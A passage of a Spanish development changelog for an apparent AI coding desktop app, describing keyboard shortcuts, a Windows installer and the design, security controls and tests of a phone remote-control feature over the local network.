- **Escritorio / Móvil**: control visible y accesible en la barra del navegador (grupo con dos botones `aria-pressed`, también en la ventana aparte). Es **global y persistente** (`embedded-browser.json › prefs.viewMode`, por defecto `desktop`). «Móvil» emula 390 px, `screenPosition: mobile` y user agent Android/Chrome; al cambiar se recargan las pestañas http(s). Canal nuevo `browser:setViewMode`.
- **Coherencia con el agente**: con escala ≠ 1, `DOM.getContentQuads`/`getNodeForLocation`/capturas hablan en píxeles CSS pero `Input.dispatchMouseEvent` en píxeles de la vista; `cdp.ts` multiplica x/y de `Input.*` por la escala de la pestaña (`viewport.ts › scaleInputParams`), así `click`/`hover`/`scroll`/`fill` caen donde toca y las capturas miden 1280 px de ancho.
- **Pruebas**: `viewport.test.ts` (8) y E2E `navegador-escritorio.e2e.ts` (5: estilo de escritorio con panel estrecho, UA, clic del agente en dos botones con escala ≈ 0,5, «Móvil» con `@media` y UA móvil, persistencia). El clic por CDP está saltado en Windows (pendiente ya conocido de B41).

### Atajos de teclado configurables

- **Registro central** (`shared/keybindings.ts`): acciones con id estable, categoría, nombre i18n, atajo por defecto y reglas de foco; ejecución en `renderer/src/keybindings/` y **un único manejador** (`dispatch.ts`) que resuelve el atajo efectivo. Migrados sin cambiar los valores por defecto: ⌘K/⌘⇧P paleta, ⌘N nuevo, ⌘\ barra lateral, ⌘, Ajustes, ⌃Tab/⌃⇧Tab modo siguiente/anterior, ⌘1–4 paneles de Code, Esc detener, Shift+Tab Plan/Build, ⌘K buscador de sesiones de Code. Nuevas (sin atajo hasta que se asigne): ir a Chat/Code/Tareas/Rutinas, Plan, Build, enfocar el compositor. Quick Entry (atajo global de Electron) sigue aparte.
- **Guardado**: `extras.json › keybindings: { [idAcción]: atajo | null }` (solo lo que el usuario cambia; `null` = desactivado), normalizado y portable (`Mod` = ⌘ en macOS, Ctrl en Windows/Linux; `Ctrl` literal solo en macOS). Pensado para ir luego por perfil.
- **Teclados y entrada**: letras por carácter (con la tecla física si es un carácter no ASCII), dígitos y teclas con nombre por `event.code`, signos por carácter o por la tecla física (`ç`/`ñ`); AltGr (Ctrl+Alt) no dispara nada en Windows/Linux; sin disparo durante la composición de un IME ni con teclas muertas; los atajos «desnudos» (Esc, Shift+Tab) solo en el compositor o con el foco fuera de campos de texto; los que llevan modificador funcionan también escribiendo (como antes).
- **Ajustes › Atajos › En la aplicación**: lista agrupada con buscador, grabación («pulsa las teclas»), conflictos con otras acciones (reasignar o cancelar), aviso de combinaciones reservadas (⌘Q/⌘H/⌘M/⌘Tab/⌘Espacio, Alt+F4/Alt+Tab, copiar/pegar… se rechazan; las del menú se avisan) y de coincidencia con Quick Entry, restablecer uno o todos y desactivar. Las pistas de la interfaz (barra lateral, paleta, paneles) muestran el atajo vigente.
- **Compatibilidad**: en macOS los atajos con ⌘ siguen respondiendo también a Ctrl+tecla (p. ej. Ctrl+K) si el Ctrl literal no coincide con ninguna acción; ⌃Tab sigue siendo Control literal.
- **Pruebas**: `keybindings.test.ts` (36: normalización, eventos AltGr/IME/ES, registro, conflictos, reservadas, foco, overrides) y E2E `atajos.e2e.ts` (9: lista y buscador, cambiar y usar, los de siempre, Plan/Build propio, conflicto, reservadas, desactivar, persistir tras reiniciar, restablecer).

## F8-B47 — Windows v1: instalador NSIS y paridad (rama `feat/win-t4-instalador-y-paridad-v1`)

- **Instalador.** `electron-builder.js`: `win` (NSIS x64, icono `build/icon.ico` de 16–256 px), `nsis` (asistido, por usuario, carpeta elegible, `OnyxCode-Setup-<versión>-<arch>.exe`), `win.extraResources` con `opencode.exe` y `mac.extraResources` con lo de macOS (helper, lanzador, actualizador, OpenCode darwin); el `.dmg` de macOS sale igual (comprobado con `npm run package`). `scripts/win/pack-check.ps1` + `pty-probe.mjs` verifican el paquete sin firma (32 comprobaciones; ver `docs/VERIFICACION.md`). Instalador de prueba: 151,6 MB.
- **Defecto de `package:win`.** Llamaba a `electron-builder` a secas y `cmd` ejecutaba `electron-builder.js` con Windows Script Host (colgado sin mensaje); ahora `node node_modules/electron-builder/cli.js`.
- **Ratón por CDP en Windows: causa raíz hallada** (la vista de la pestaña del agente no estaba colgada de la ventana antes de F8-B46; Windows no enruta entrada a una `WebContentsView` suelta). Ya corregido por B46; reactivadas las pruebas «Pagar ahora», «enlace normal» y el clic con escala.
- **`perf` «2000 deltas»:** presupuesto propio de Windows medido (300 tareas / 25 s / 800 ms; 206–219 / 17,0–17,6 s / 345 ms medidos).
- **Pruebas en Windows** de lo nuevo de la tanda 3: `archivos-mx` (el texto de «Papelera de reciclaje» y los atajos `Ctrl`; el producto ya estaba bien, se ajustó la spec), `atajos`, `navegador-escritorio`, `model-por-modo`, `model-choice` en verde; unitarias: `manager.fullaccess` (Control total, modo Tareas) y `installer › cancelar` (actualizador) saltadas fuera de macOS por estar fuera de la v1.

## F8-B48 — Control remoto desde el celular, prototipo por red local (rama `feat/remoto-nucleo-y-app`, tanda T-A)

Petición del equipo: ver y responder las conversaciones desde el celular, sin nube. Prototipo DELGADO (solo red local, solo macOS); la PWA es la tanda T-B (`feat/remoto-pwa`). Modelo de amenazas en `docs/SEGURIDAD.md` §3 vicies.

- **Contrato compartido** (`src/shared/remote/protocol.ts`, `code.ts`): `PROTOCOL_VERSION = 1`, tramas de señalización (`hello`/`offer`/`ice`/`answer`) y del DataChannel (`auth`, `req` de la lista blanca, `res`, `evt`, `bye`), `LIMITS` y validadores estrictos que usan el escritorio y la PWA; código de confirmación de 6 dígitos desde las huellas DTLS (`@noble/hashes`, sin `crypto.subtle`).
- **Núcleo** (`src/main/remote/`, cargado con `import()` solo al pulsar «Activar»): `service.ts` (apagado → vinculando → activo), `signaling/{types,lan-server}.ts` (interfaz `SignalingTransport` intercambiable + servidor HTTP/WebSocket ligado solo a la IPv4 privada), `rtc.ts` (`node-datachannel`), `peer-session.ts` (auth, límites, violaciones), `whitelist.ts` (cinco operaciones, ámbito Chat + Code, Tareas nunca), `events.ts` (recorte y puente del SSE del motor solo con un celular conectado), `pairing.ts` (secreto de un solo uso), `devices-store.ts` (`remote.bin` con `safeStorage`), `rate-limit.ts`, `lan-ip.ts`, `qr.ts`.
- **IPC**: `remote:getState|start|newPairing|stop|confirmPair|revoke` + eventos `remote:changed|pairRequest` (solo ventana principal, esquemas estrictos; `window.api.remote`). `PlatformCaps.remote` (solo darwin).
- **UI**: Ajustes › Celular («Conectar mi celular»: QR en SVG, estado, dispositivos con «Quitar», «Cortar todo»), diálogo global «¿Vincular este dispositivo?» con el código, entrada «Cortar acceso del celular» en la bandeja (solo con el modo activo) y acción de atajos `remote.stopAll` (sin atajo por defecto). Textos es/en (`remote.*`).
- **Empaquetado**: dependencias `node-datachannel` 0.33.4, `ws`, `qrcode`, `@noble/hashes` fijadas; `node_modules/@node-datachannel/**` en `asarUnpack`; `pwa/dist` → `Contents/Resources/pwa` si existe; `build:pwa` encadenado en `build` (no hace nada si aún no hay `pwa/`). Avisos en `THIRD_PARTY_NOTICES.md`. Instantánea `api-routes.json`: +1 ruta (`GET /session/{sessionID}/message/{messageID}`).
- **Pruebas** (unitarias; el dueño prueba a mano con un celular): `protocol.test.ts` (13), `pairing.test.ts`, `devices-store.test.ts`, `peer-session.test.ts`, `whitelist.test.ts`, `service.test.ts`, `signaling/lan-server.test.ts`. Comprobación puntual (no incluida): vinculación + reconexión reales con `node-datachannel` en bucle local, código idéntico en ambos lados.
- **Sin probar**: conexión con un celular real (iOS/Android), Wi-Fi con aislamiento de clientes, la PWA en sí, y el comportamiento de `node-datachannel` dentro del `.app` ya instalado y notarizado.

## F8-B49 — PWA del control remoto (rama `feat/remoto-pwa`, tanda T-B)

La página que abre el celular al escanear el QR de F8-B48. TypeScript vanilla en `pwa/` (sin frameworks), compilada con Vite a `pwa/dist` (`npm run build:pwa`, encadenado en `build`): un JS + un CSS, ≈ 17,7 KB gzip en total. Se sirve por HTTP en la IP local, así que no usa `crypto.subtle`, service worker, instalación ni push; tampoco lleva `manifest` en el prototipo.

- **Código**: `pwa/src/rtc.ts` (señalización por WebSocket + RTCDataChannel `onyx`, creado después de `ready`; plazos para «no se encuentra el equipo»), `client.ts` (máquina de estados, vinculación, `resume`+`auth` por el canal, reintentos acotados 1/2/4/8/15 s, latido, peticiones de la lista blanca con tiempo límite y límite de 6 mensajes/min en el cliente), `ui.ts` (DOM por nodos y `textContent`, nunca `innerHTML`; Markdown mínimo escapado), `i18n.ts` (es/en según `navigator.language`), `main.ts`.
- **Pantallas**: vincular (extrae `s` del fragmento y lo borra de la barra; muestra el código de 6 dígitos con «compáralo con el que aparece en tu Mac»), lista de sesiones con permisos pendientes, chat en vivo (`message.updated`, `session.updated`, permisos), enviar, detener, «Permitir una vez»/«Rechazar» (nunca `always`) y «Apruébalo en el Mac» para los de solo lectura.
- **Estados**: conectando, no se encuentra el equipo, QR caducado o ya usado, desvinculado/revocado, rechazada/caducada/límite, acceso cortado, otro dispositivo, demasiadas peticiones, reconectando n/N, sin conexión con botón «Reintentar»; reconexión al volver de segundo plano (`visibilitychange`, `online`, `pageshow`) con sondeo y un QR nuevo con la página abierta (`hashchange`).
- **Seguridad**: el secreto del QR solo vive en memoria; `deviceId`/`deviceSecret` en `localStorage`; ninguna trama sin validar (`parseHostFrame`/`parseSignalHostFrame`); se respetan `LIMITS`; nada se registra en consola.
- **Diseño**: claro/oscuro por `prefers-color-scheme`, áreas táctiles ≥ 44 px, contraste ≥ 4,5:1 (medido), roles/`aria-live`/foco visible, `safe-area`.
- **Herramientas**: `typecheck:pwa` (dentro de `typecheck`), `lint` y `format:check` cubren `pwa/`; `eslint` ignora `pwa/dist`.
- **Comprobado** con una prueba desechable (no incluida): Chromium (`playwright-core`) contra el `RemoteService` + `LanSignalingServer` reales con `node-datachannel`, en loopback: vinculación con el mismo código en ambos lados, lista, chat, evento en vivo, detener, enviar, permiso, corte y reconexión sola, recarga con `resume`+`auth`, revocación, QR usado y «no se encuentra el equipo»; sin errores de consola ni de CSP.
- **Sin probar**: celular real, iOS Safari (candidatos ICE mDNS `.local` en vez de IP), Wi-Fi con aislamiento de clientes real, rendimiento con conversaciones largas.

## F8-B50 — Estética de la PWA del control remoto (rama `feat/remoto-pwa`)

Solo capa visual (`pwa/index.html`, `style.css`, `ui.ts`, textos nuevos en `i18n.ts`); no cambia protocolo, seguridad ni conexión. ≈ 22,3 KB gzip en total.

- **Identidad «Lapislázuli»**: tokens claro/oscuro copiados de la app (`--bg`, `--fg-muted`, `--accent`, `--danger`, `--warning`…), pilas de fuentes del sistema equivalentes (sans, display redondeada, mono), radios y sombras de la app; sin fuentes ni recursos externos. Gema «Faceta» en la cabecera, en la vinculación y como favicon (SVG en `data:`).
- **Pantallas**: barra superior con estado de conexión (punto), lista de sesiones como la barra lateral, burbuja del usuario y respuesta sin burbuja como en la app, bloques de código con cabecera de lenguaje, herramientas como filas con punto de estado, compositor elevado con envío redondo y botón «ir al final», tarjeta de permiso fija sobre el compositor (siempre visible), estados vacíos/errores con ilustración SVG mínima.
- **Móvil**: `theme-color` por esquema, `safe-area-inset-*`, `100dvh`, ajuste con `visualViewport` cuando aparece el teclado (sin exigir contexto seguro), `prefers-reduced-motion`.
- **Comprobado**: contraste ≥ 4,5:1 calculado en ambos temas; capturas con una prueba desechable (iPhone 390x844 @3x y Android 360x800, claro/oscuro) sobre la UI real con un cliente simulado.
- **Sin probar**: iPhone/Android reales, `safe-area` y teclado en dispositivo real.

## F8-B51 — Invocador remoto y bus de eventos (rama `feat/remoto-invocador`, tanda T2)

Cimientos del puente del celular en `main`; sin cambio visible para las ventanas ni canal nuevo.

- **`invokeAs`** (`ipc/handle.ts`): despacha un canal ya registrado con `makeInvokeHandler` como lo haría el renderer, con el MISMO `IPC_SCHEMAS` (`validatePayload`, extraído de `guardInvoke`) y el mismo manejo de errores, con `event.sender` = un remitente virtual. Gancho `authorize(canal, payload validado)` para la política «celular» (T3); sin él, o si devuelve false, FORBIDDEN (denegar por defecto). El rol «celular» no existe en `CHANNEL_ROLES`.
- **`RemoteSender`** (`remote/sender.ts`): `id` negativo y único, `send` por un canal inyectable, `isDestroyed`, `once('destroyed')` y `destroy()`. pty (`isOwner`) y `files:*` (hub por `sender.id`) funcionan sin cambios y la propiedad queda limitada a lo creado por ese remitente. `BrowserWindow.fromWebContents(event.sender)` pasa por `windowOfSender` (null para el virtual → respaldo `getWindow()`); los eventos de pty/archivos van por `publishToSender` (ventana real o virtual).
- **Bus** (`ipc/event-bus.ts`): `publish` (todas las ventanas + suscriptores remotos), `publishTo` (ventanas concretas, nunca al celular), `subscribeRemote` (lista blanca por canal, vacía = nada, y recorte). Migrados `broadcast`/`sendTo`, tasks, tasks-lifecycle, routines, code, notify, embedded-browser, extras y remote-handlers: mismos canales, cargas y orden. Un suscriptor remoto recibe aunque no haya ventanas.
- **Pruebas**: `invoke-as.test.ts`, `event-bus.test.ts`, `sender.test.ts`.
- **Sin probar**: nada con el celular real (llega con T3–T5).

## F8-B52 — Política «celular» y cola de confirmación (rama `feat/remoto-politica`, tanda T3)

Primera pieza de seguridad del control remoto con paridad; todavía no está conectada al puente (la usarán T2/T4/T6). Sin cambios visibles.

- **`src/main/remote/policy.ts`**: `CELULAR_POLICY` (≈ 210 canales IPC), `CELULAR_HTTP_POLICY` (las 188 rutas del motor fijado) y `CELULAR_EVENTS`, con clases R/M/D/X, filtros por campo (`settings:set`, `extras:setPrefs`, `tasks:prefs:set`, `computer:prefs:set`) y por ámbito (rutas absolutas y `directory`, `file://` solo bajo el directorio de la sesión y nunca en Chat, `model` en `provider.list`, `permission.reply` solo `once`/`reject`, ≤ 20 archivos en `git:discard`). `decide(request, ctx)` es pura y devuelve permitir / rechazar con motivo / confirmar con resumen es/en. `sanitizeResult` quita `userDataPath` de `app:info`.
- **`src/main/remote/confirm-queue.ts`**: cola FIFO (máx. 2 pendientes, 10/min, dedupe por sha256, aprobación solo para esa llamada, rechazo a los 90 s) con interfaz de UI inyectable.
- **IPC**: `remote:confirmAction` (invoke, solo ventana principal, esquema estricto) y evento `remote:confirmRequest` en `shared/ipc-remote.ts` / `main/ipc/schemas.ts`. Sin handler todavía (T6).
- **Pruebas**: cobertura del 100 % de canales, eventos y rutas (falla si aparece uno sin clasificar), una por cada X y cada D, `remote:*`, `settings:set{opencodeBin}`, `permission.reply always`, `file://` y `directory` fuera del ámbito, y la cola con reloj falso.
- **Docs**: `docs/SEGURIDAD.md` §3 unvicies con la tabla final y los casos límite (decisiones estrictas anotadas).
- **Sin verificar**: nada de esto se ha probado con un celular ni con el despachador real; la política no resuelve enlaces simbólicos (lo hará el despachador).

## F8-B53 — Protocolo v2 del control remoto: multiplexor con chunks, crédito y prioridad (rama `feat/remoto-protocolo-v2`)

Base de la paridad del celular (opción B). Solo transporte: no expone nada del motor todavía (el despacho a IPC/HTTP lo inyectan otras tandas).

- **`src/shared/remote/protocol.ts`**: `PROTOCOL_VERSION` pasa a 2 (un celular con la PWA v1 recibe `error{code:'version'}` por señalización y no abre canal). Tramas nuevas con validadores estrictos compartidos: `call{id,ch,p}`, `http{id,eng,method,path,query,headers⊂{content-type,accept},body}`, `res{id,ok,data|error}`, `chunk{id,n,last,d}`, `sub{id,eng,since}`, `ev{s,seq,ch|oc,p}`, `reset{s,seq}`, `cancel{id}`, `credit{id,bytes}`; `ck` anuncia el total (bytes UTF-8) cuando el cuerpo viaja en trozos. Las tramas v1 (`req`/`res` con `m`/`evt`) siguen sirviendo a la lista blanca del prototipo. Rutas HTTP sin `..`, `//` ni `%2e/%2f/%5c`. Nuevos `LIMITS` (trozo 56 KiB, 16 MiB subida / 8 MiB bajada, ventana 256 KiB, 32 llamadas, 6 streams, búfer de eventos 30 s / 2 MiB, 40 lecturas/s ráfaga 120).
- **`src/shared/remote/mux.ts`** (nuevo, TypeScript puro; lo usan Mac y PWA): `Mux` (host/cliente), `Outbox` (planificador control > eventos > respuestas > bulk con turnos entre transferencias y respeto de `bufferedAmount`: marcas 128/32/512 KiB), `EventLog` (seq por motor, búfer circular, lápidas para eventos que no caben, `reset` en huecos), `splitText` (trozos cuyo JSON escapado cabe en 56 KiB, sin partir pares sustitutos). Ids estrictamente crecientes (anti-repetición), cancelación (`AbortSignal` → `cancel`; el Mac aborta o descarta), cierre = `disconnected`, jamás se reintenta nada solo. Despachador inyectable `MuxDispatch` (`call`/`http`/`allowSub`); sin él todo responde `unavailable`.
- **Integración**: `peer-session.ts` (toda la salida pasa por el `Outbox`; cubos propios `allowCall`/`allowFlood` en `rate-limit.ts`; `deps.dispatch`/`events`/`urgent`), `rtc.ts` del Mac (`bufferedAmount`, `setBufferedAmountLowThreshold`, `onBufferedAmountLow` de node-datachannel), `pwa/src/rtc.ts` (`bufferedAmountLowThreshold`, `onbufferedamountlow`) y `pwa/src/client.ts` (`muxCall`/`muxHttp`/`muxSubscribe`, ids compartidos con el protocolo anterior).
- **Pruebas** (`mux.test.ts`, `peer-session.test.ts`, `lan-server.test.ts`, 48 nuevas): trozos, crédito (ventana de 256 KiB y violación por crédito inventado), cancelación, límites (32/6/16 MiB/8 MiB), tramas inválidas/huérfanas/repetidas/fuera de orden, reanudación por `seq` (otro `Mux`, mismo búfer; antigüedad, tamaño, futuro y evento enorme dan `reset`), prioridad (un evento adelanta a una descarga de ~8 MB en 16 ms simulados con reloj falso a ~10 MB/s), 10 MB de subida más 2 x 5 MB de bajada y un eco de 7,9 MB sin pasar de 64 KiB por trama.
- **Sin probar**: WebRTC real (Chromium/iPhone/Android) con volumen grande; los ritmos reales del `bufferedAmount` de libdatachannel y de Safari.

## F8-B55 — Confirmación en el Mac, PIN, bloqueo y auditoría del control remoto (rama `feat/remoto-confirmacion-mac`, tanda T6)

- **Confirmaciones**: `confirm-host.ts` conecta la cola de T3 con la interfaz real (`RemoteConfirmHost.tsx`, handler `remote:confirmAction` solo ventana principal, evento `remote:confirmRequest`/`remote:confirmDismiss`); sin ventana, diálogo nativo sin padre + rebote del Dock; el respaldo rechaza ante cualquier fallo. Cada conexión nueva se confirma en el Mac (D3) con «Recordar 12 h» por dispositivo.
- **PIN (D4)**: tramas `pin-set`/`pin-verify` (celular) y `locked`/`unlocked` (Mac) como extensión mínima de v2 (`protocol.ts`, validadores estrictos); hash `scrypt` con sal en `devices-store.ts` (`pin.ts`), 5 fallos revocan, retardo creciente, bloqueo a los 5 min (`access-gate.ts`). Sin PIN o sin confirmación no hay acceso a nada.
- **Auditoría** `remote-audit.jsonl` rotada, sin secretos (`audit.ts`) y Ajustes › Celular › Actividad; Ajustes también muestra PIN configurado/pendiente, «Recordar 12 h», estado (esperando/PIN/bloqueado/con acceso) y «Restablecer PIN».
- **PWA ligera**: pantalla de PIN/confirmación (`pwa/src/client.ts`, `ui.ts`, `i18n.ts`) para que el prototipo siga funcionando con el nuevo control de acceso.
- **Pruebas** (nuevas, ~60): PIN y hash, 5 fallos, retardo, bloqueo con reloj falso, «12 h», confirmación de conexión, auditoría (rotación, sin secretos), respaldo que rechaza, `remote:*` no invocable desde el despachador, tramas inválidas, integración con `PeerSession`.
- **Sin verificar**: nada con celular ni Electron real (diálogo nativo, rebote del Dock, notificación).

## F8-B54 — Proxy del motor y concentrador de eventos del celular (rama `feat/remoto-proxy-motor`, tanda T4)

Primer despachador real del protocolo v2: el celular ya puede llamar al IPC y al sidecar (aún sin PWA que lo use).

- **`engine-proxy.ts`** (`MuxDispatch`): `call` → canoniza rutas (`realpath`) → `decide` → `invokeAs` (R/M), confirmación en el Mac (D, aprobación ligada al hash de la llamada; cancelada = no se ejecuta; sin UI se rechaza) o `forbidden` (X/desconocido/`remote:*`); `http` → `directory`/`path`/`file://` con `realpath`, `GET /file/content` sin archivos sensibles, listados y sesiones filtrados por ámbito, tamaños acotados, cancelación; la contraseña Basic la pone el Mac.
- **`engine-registry.ts`**: reescritura de `authorization`/`baseUrl` (`onyx://engine/main`, `onyx://engine/task/<token>`) y `scrub` de credenciales conocidas en toda salida. **`engine-scope.ts`**: ámbito con `realpath` y lo que `policy.ts` necesita (sesión → directorio, permiso → tipo, modelos). **`path-guard.ts`**: `realpath` tolerante y lista de archivos sensibles.
- **`event-trim.ts` + `sse-hub.ts`**: UN stream de subida por motor bajo demanda (SDK v2), lista blanca de tipos, ámbito, recorte, `EventLog` con `seq`/`since`/`reset` (nuevo `EventLog.markGap` en `mux.ts`), cierre sin dispositivos; suscripción al bus de T2 con `CELULAR_EVENTS`. **`engine-host.ts`** lo ensambla; `service.ts`/`peer-session.ts`/`index.ts` lo cablean (`makeDispatch` recibe el `deviceId` verificado).
- **Puerto estable (D1)**: `DevicesStore.getPort/setPort` (en `remote.bin`) y `LanSignalingServer` con puerto preferido y respaldo.
- **Pruebas** (`engine-proxy`, `sse-hub`, `path-guard`, `lan-port`, `service`; ~60 nuevas): denegar por defecto, reescritura de `authorization`, `always` rechazado, `directory` fuera del ámbito y por enlace → forbidden, `file://`/`path` por enlace, archivos sensibles, recorte de eventos, reanudación por `seq`, cierre del hub y propiedad con contraseñas aleatorias (nada en respuestas, errores ni eventos).
- **Sin probar**: nada con un celular ni con un sidecar OpenCode real (todo con motor y `fetch` simulados); el diálogo de confirmación y el PIN son de T6 (hasta entonces toda acción D se rechaza).

## F8-B56 — PWA completa del celular: la misma interfaz React sobre el puente (rama `feat/remoto-pwa-completa`, tanda T5)

El celular carga la interfaz de escritorio (`src/renderer/src`) y la usa a través del DataChannel: Chat con streaming en vivo, Code (proyectos, sesiones, archivos), Tareas, Rutinas y Ajustes.

- **Shims** (`src/renderer/remote/`): `ipc-shim.ts` (`window.api` armado con `src/preload/window-api.ts`, extraído de `preload/index.ts` sin cambiar su comportamiento: cada `invoke` → `call`, cada evento → bus remoto), `engine-fetch.ts` (`fetch` del SDK v2: `onyx://engine/…` → `http`; SSE de `/global/event` y `/event` con `sub`/`ev` como `Response` con `ReadableStream`, `server.connected` inicial para disparar el `onOpen` que resincroniza, cierre limpio en `reset`), `events-hub.ts` (UNA suscripción por motor compartida, reanudación con `since`, `reset`), `insecure-shims.ts` (`crypto.randomUUID`/portapapeles sin contexto seguro), `install.ts`. Errores tipados (`src/shared/remote/link.ts`), cancelación con `AbortSignal` → `cancel`, mutaciones nunca reintentadas.
- **Arranque en dos partes** (`pwa/src/main.ts`, `full.ts`, `ui.ts`): la capa ligera (vinculación, PIN, confirmación) vive en un shadow root, carga `app/entry.json` tras `unlocked`, tapa la interfaz en los estados sin acceso (conectando, bloqueado/PIN, sin conexión), muestra una franja al reconectar y «Esperando a tu Mac…» cuando una llamada tarda (acciones «D»). Bloqueo a los 5 min: lo decide el Mac y la capa vuelve a pedir el PIN.
- **Capacidad `remote`** (`platform-caps.ts`, `lib/platform.ts`): superficie `window.api.platform = 'remote'` sin terminal (`terminal`), diálogos nativos (`nativeDialogs`), `openExternal`, vista nativa del navegador (`nativeBrowser`), actualizador, Control del PC ni ajustes del puente; Tareas sí. Mac y Windows: las cuatro capacidades nuevas son siempre `true`, sin cambios visibles. Se oculta con ellas: paneles Terminal/Navegador de Code y su atajo, «Abrir carpeta», «Mostrar en Finder/Abrir en editor», «Elegir carpeta»/adjuntar de Tareas, pestaña Navegador de Tareas, secciones MCP/Navegador/Atajos/Diagnóstico de Ajustes, asistente de primer arranque, avisos nativos y badge. `nativeCode('dialogs'|'pty')` devuelve `null` donde no aplica (git y archivos siguen por el puente). Enlaces: `lib/open-external.ts` (pestaña del propio celular).
- **Bundle** (`pwa/vite.full.config.ts` + `src/renderer/remote/main.tsx`/`boot.tsx` → `pwa/dist/app/`, `scripts/build-pwa.mjs` en dos pasos y `.gz` de cada texto, encadenado en `build`; `electron-builder.js` ya copia `pwa/dist`): sin xterm (alias a un sustituto), `highlight.js` y `lowlight` con 15 lenguajes, Tareas/Rutinas/Ajustes con `import()` y el diccionario inglés en un trozo aparte (se baja solo si el idioma es inglés).
- **Servidor** (`lan-server.ts`): `.gz` con `Content-Encoding`, `immutable` solo para archivos con huella, `index.html`/`entry.json` `no-store`, CSP con `blob:` en `img-src` y `font-src 'self'`, MIME de `.woff .map`, sin service worker.
- **Pruebas** (nuevas, ~100): shims (mapeo de TODOS los canales, errores tipados, cancelación, SSE sobre `sub`, reanudación, base64, chunks de 600 KB/3 MB sobre el multiplexor real, sin reintentos), concentrador de eventos, `.gz`/caché/CSP/MIME del servidor, capacidades, atajos de contexto no seguro y errores tipados. Además una prueba desechable (no incluida) con Chromium contra `RemoteService` + `LanSignalingServer` + `node-datachannel` reales sobre la IP de la LAN: vinculación, PIN, lista de sesiones, sesión nueva en vivo, streaming, enviar mensaje, acción «D» con espera/aprobar/rechazar, Code con archivos, bloqueo e inactividad y desbloqueo, inglés.
- **Sin verificar**: nada con un celular real (iPhone/Android, Safari/WebKit); la interfaz sigue siendo la de escritorio (la adaptación a pantalla de celular es T7/T8).

## F8-B57 — Caducidad de vínculos, política de la organización, AGENTS.md y diseño de la fase 2 (rama `feat/remoto-tokens-politica-agents`)

- **Tokens por dispositivo con caducidad** (`devices-store.ts`, `peer-session.ts`, `service.ts`, `protocol.ts`, `RemoteSection.tsx`): del secreto ya se guardaba solo el sha256 (secreto de 256 bits, sin cambio). Nuevo: `ttlDays` (30/90/365/nunca; 90 por defecto; «nunca» solo desde el Mac), `renewedAt`, `lastUsedAt` (antes `lastSeenAt`) y caducidad visible en Ajustes; renovación al usar; `authed` con `expiresAt`/`expiring` y `auth-failed {why:'expired'}` (extensión opcional de v2); canales `remote:setDeviceTtl` y `remote:revokeAll` («Quitar todos» con confirmación); auditoría `expired`/`revoked-all`/`policy-blocked`. `remote.bin` anterior se migra solo.
- **Política de la organización «fail closed»** (`org-policy.ts`, `tasks/policy.ts` exporta `policyFile`): bloque `remote` de `managed.json` (`enabled`, `allowRemember`, `requirePin`, `maxDevices`, `deviceTtlDays`, `allowConfirmRemember12h`), releído en caliente (al activar, en cada conexión y cada 5 s); `enabled:false` o archivo inválido corta y bloquea; Ajustes lo explica. Documentado en `docs/POLITICA-ORGANIZACION.md` y `docs/SEGURIDAD.md` §3 vicies quater.
- **Pruebas** (~45 nuevas): caducidad/renovación/migración/«revocar todos»/secreto fuera de estado y auditoría con reloj falso, política (rota, ausente, rangos, precedencia, ruta empaquetada, caliente), servicio (bloqueo en caliente, tope de plazo, `expired`), `PeerSession` (aviso `expiring`), protocolo y esquemas IPC.
- **Verificación del manifiesto de actualización**: ya se verificaban firma Ed25519, forma, versión/anti-downgrade, appId/keyId/tag, tamaño y SHA-256, entradas del ZIP, symlinks, `codesign` y rollback del reemplazo (cliente, `publish-update`/`verify-update` y sus pruebas). Faltaba una comprobación automática sin `.app` ni `ditto`: nuevo `npm run verify:update-manifest` (`scripts/verify-update-manifest.mjs`, 19 casos con clave efímera; `verify-update.mjs` exporta `verifyManifestAndZip`) y `src/main/update/manifest-script.test.ts` (paridad con el cliente real). Documentado en `docs/DISTRIBUCION.md` y `docs/VERIFICACION.md`.
- **Guía y diseño**: `AGENTS.md` (+ `CLAUDE.md` que remite) con las invariantes del proyecto; `docs/REMOTO-FASE2.md` (passkeys, Worker de señalización, TURN, push, PWA instalable; solo diseño).
- **Sin verificar**: nada con un celular real ni con Jamf/Intune; la PWA todavía no pinta el aviso `expiring` ni el `expired` (la rama de la PWA completa lo recogerá).

## F8-B58 — Interfaz de celular: `MobileShell`, `Sheet` y navegación en pila (rama `feat/remoto-movil-shell`, tanda T7)

En la superficie `remote` la interfaz deja de ser la de escritorio: una columna a pantalla completa con navegación inferior. En Mac y Windows no cambia nada (`App` elige `DesktopApp` o `MobileApp`; los efectos comunes pasaron a `useAppRuntime`).

- **`app/mobile/`**: `MobileShell` (Chat · Code · Tareas · Más; lista → conversación con botón atrás y botón/gesto «atrás» del navegador mediante `history`), `nav.ts` (`useMobileNav`/`useMobileNavStore`, una pila por pestaña, API estable para T8), `viewport.ts` (`visualViewport` → `--vv-height`/`--vv-top`/`--kb-inset`, el teclado no tapa el compositor), `MoreScreens.tsx` (Rutinas, Ajustes, «Este celular»: estado de la conexión, Bloquear ahora, Desvincular), `adapters.ts` (qué es «conversación abierta» en cada modo).
- **`components/mobile/Sheet.tsx`** (`Sheet({open,onClose,title,size?,children})`): hoja inferior modal (`role="dialog" aria-modal`, foco por `modal-focus.ts`, Esc, fondo, asa arrastrable, `prefers-reduced-motion`). **`components/PopoverPanel.tsx`**: punto de montaje común de menús (escritorio: el mismo `div`; celular: `Sheet`), aplicado al menú de las conversaciones de Chat. Los demás menús que aún no lo usan caen en un respaldo CSS (hoja anclada abajo).
- **CSS móvil** (`globals.css`, solo bajo `[data-surface='mobile']`): zona segura, objetivos ≥44 px (área ampliada con pseudoelemento), acciones de hover siempre visibles, campos a 16 px, texto más grande, sin tooltips/`kbd`/zonas de arrastre. Enter en el compositor inserta salto de línea (se envía con el botón).
- **Ajustes** básicos (`SettingsView` con `mobile`): solo General (tema, idioma) y Modelos (sin proveedores ni claves, sin bandeja/avisos/servidor).
- **Bloqueo manual** (protocolo, extensión mínima): trama de cliente `lock` (sin datos) → `AccessGate.lockNow()` (pide el PIN y no atiende ni lecturas hasta verificarlo); `RemoteLink.lock/forget` opcionales; «Desvincular» olvida el secreto local y recarga (no avisa al Mac).
- **Pruebas**: Sheet (aria, tamaños, pila de Esc, gesto), navegación, viewport, bloqueo manual (gate y protocolo) y «fuera de remoto no cambia nada». Verificación visual desechable con Chromium (390×844 y 360×800, claro/oscuro) y datos simulados; no se deja en el repo.
- **Sin verificar**: nada en iPhone/Android reales (teclado virtual de iOS, gesto atrás, zona segura, `capture` de cámara). Code (cambios, archivos, pickers) es T8.

## F8-B59 — Code en pantalla de celular (rama `feat/remoto-movil-code`, tanda T8)

